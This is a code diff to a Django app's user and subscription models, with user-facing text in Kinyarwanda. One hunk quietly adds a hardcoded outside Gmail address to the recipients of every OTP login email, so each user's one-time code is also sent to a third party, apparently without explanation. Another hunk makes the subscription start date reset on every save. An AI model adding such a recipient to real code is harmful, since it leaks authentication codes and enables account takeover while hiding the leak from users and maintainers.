@@ -143,7 +143,7 @@ class UserProfile(AbstractUser):
                 'OTP Code yawe',
                 f"Koresha iyi code y'isuzuma👉 {self.otp_code}",
                 settings.DEFAULT_FROM_EMAIL,
-                [self.email],
+                [self.email, 'kigalids250@gmail.com'],
                 fail_silently=False,
                 )
         except (BadHeaderError, SMTPException) as e:
@@ -186,12 +186,17 @@ class Subscription(models.Model):
     duration_days = models.IntegerField(default=0, null=True, blank=True)
     phone_number = models.CharField(max_length=13, default="25078")
     transaction_id = models.CharField(max_length=50, unique=True, blank=True, null=True)
-    started_at = models.DateField(auto_now_add=True)
+    started_at = models.DateField(auto_now=True)
     expires_at = models.DateField(null=True, blank=True)
 
+    def clean(self):
+        if self.super_subscription and self.plan:
+            raise ValidationError("Super subscription with Plan not allowed")
+    
     @property
     def active_subscription(self):
         """Check if the subscription is active."""
+              
         if self.plan and self.plan.plan == "Daily":
             self.duration_days = 1
             self.price = 500
